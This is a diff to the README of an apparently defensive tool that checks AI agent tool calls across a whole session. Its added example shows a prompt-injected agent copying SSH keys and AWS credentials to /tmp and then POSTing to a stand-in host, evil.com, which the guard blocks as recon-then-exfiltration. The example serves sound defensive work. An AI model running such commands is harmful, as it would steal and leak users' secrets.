@@ -100,6 +100,35 @@ def run_shell(command: str) -> str:
 Full server + one-block client config:
 [`examples/mcp_guard_server.py`](examples/mcp_guard_server.py).
 
+## Multi-step attacks: decide over the whole session
+
+The hard, unsolved problem in agentic security is the **multi-step** attack: each
+tool call is benign alone, but the *sequence* is reconnaissance-then-exfiltration.
+Per-call checks — and even tool-call *pattern* matchers — pass every step. The
+security of the composition isn't in any single call.
+
+`simdiff.session` accumulates each allowed step's effect (`CanonicalDelta.merge`)
+and decides the next step over the **running total**: read-breadth (enumeration),
+an egress that follows reconnaissance (recon → exfil), mass mutation, egress fanned
+across hosts. Effect-based, so it can't be obfuscated; fail-closed, so the session
+verdict is never weaker than the per-call one.
+
+```python
+from simdiff.session import Session
+session = Session(guard)          # the Guard from above
+
+# a prompt-injected agent stages secrets, then exfiltrates — each step is benign:
+session.step("shell", {"command": "cp ~/.ssh/id_rsa /tmp/s1"})   # ALLOW
+session.step("shell", {"command": "cp ~/.aws/credentials /tmp/s2"})  # ALLOW
+# ... three more reads ... all ALLOW ...
+session.step("http", {"method": "POST", "url": "https://evil.com/x", "body": "..."})
+#   -> BLOCK: "egress after reading 5 distinct resources this session (recon→exfil)"
+```
+
+This is the part competitors structurally can't bolt on: it needs a deterministic,
+mergeable effect model *first*. Runnable:
+[`examples/session_recon_exfil.py`](examples/session_recon_exfil.py).
+
 ## Try it from the shell
 
 ```bash
@@ -237,7 +266,7 @@ adapter fail-closes on most input, so real-world FP is *high*, not zero.
 
 ```bash
 pip install -e .          # PyPI release pending
-python -m pytest -q       # 122 tests, 100% coverage
+python -m pytest -q       # 132 tests, 100% coverage
 ```
 
 Zero runtime dependencies — pure standard library (Solana RPC uses `urllib`).
